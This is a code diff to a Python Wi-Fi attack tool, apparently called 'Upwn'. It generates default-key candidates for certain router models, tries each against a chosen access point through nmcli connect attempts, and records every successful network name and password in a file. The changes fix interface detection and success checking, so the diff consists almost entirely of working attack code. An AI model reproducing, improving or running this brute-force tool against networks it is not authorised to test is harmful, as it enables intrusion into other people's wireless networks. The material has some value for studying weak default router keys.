@@ -136,7 +136,7 @@ class Upwn(object):
         print OKGREEN + "Wifi Interfaces found:" + ENDC
 
         iwconfig = subprocess.check_output("iwconfig", stderr=open(os.devnull, 'w'))
-        interfaces = re.compile('(wlan+\d)').findall(iwconfig)
+        interfaces = re.compile('(wlp\d\S+)').findall(iwconfig)
 
         i = 0
         for item in interfaces:
@@ -232,7 +232,6 @@ class Upwn(object):
         print "[2] SBAP {" + str(len(Upwn.sbap)) + "}"
         print "[3] all  {" + str(len(Upwn.testall)) + "}"
 
-        prefix = ''
         while True:
             try:
                 response = raw_input(WARNING + "\nselect prefix: " + ENDC)
@@ -290,6 +289,7 @@ class Upwn(object):
 
             if found == 0:
                 ubeekeys = re.compile('([A-Z]{8})').findall(ubee)
+
             return ubeekeys
 
         # the rest
@@ -351,7 +351,8 @@ class Upwn(object):
     def keytest(aplistnr, key, interface):
         cnt = 0
         subprocess.Popen(['nmcli', 'connection', 'delete', 'id', Upwn.ap_list[aplistnr]],
-                         stderr=open(os.devnull, 'wb'))
+                         #stderr=open(os.devnull, 'wb'))
+                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
         for item in key:
             cnt += 1
@@ -359,25 +360,28 @@ class Upwn(object):
             sys.stdout.write(OKGREEN + "\n[?] " + ENDC + item)
             sleep(2)
 
-            p = subprocess.Popen(['nmcli', 'device', 'wifi', 'connect', Upwn.ap_list[aplistnr], 'password', item,
-                                  'iface', interface], stderr=open(os.devnull, 'wb'))
-            streamdata = p.communicate()[0]
+            #p = subprocess.Popen(['nmcli', 'device', 'wifi', 'connect', Upwn.ap_list[aplistnr], 'password', item, 'ifname', interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            try:
+                p = subprocess.check_output(['nmcli', 'device', 'wifi', 'connect', Upwn.ap_list[aplistnr], 'password', item, 'ifname', interface])
 
-            Upwn.waiter(5)
+                Upwn.waiter(5)
+                if "successfully activated" in p:
+                    Upwn.whatyearisit += (time.time() - start_time)
 
-            if p.returncode == 0:
-                Upwn.whatyearisit += (time.time() - start_time)
+                    f = open('found.p', 'a')
+                    pickle.dump(Upwn.ap_list[Upwn.listnr], f)
+                    pickle.dump(item, f)
+                    f.close()
 
-                f = open('found.p', 'a')
-                pickle.dump(Upwn.ap_list[Upwn.listnr], f)
-                pickle.dump(item, f)
-                f.close()
+                    Upwn.win(aplistnr, item)
 
-                Upwn.win(aplistnr, item)
+            except CalledProcessError:
+                pass
 
             sys.stdout.write(FAIL + "[X]" + ENDC)
             subprocess.Popen(['nmcli', 'connection', 'delete', 'id', Upwn.ap_list[aplistnr]],
-                             stderr=open(os.devnull, 'wb'))
+                             #stderr=open(os.devnull, 'wb'))
+                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
             Upwn.whatyearisit += (time.time() - start_time)
             sys.stdout.write(" %s" % (time.time() - start_time) + "\t [" + str(cnt) + "/" + str(Upwn.allkeys) + "]")
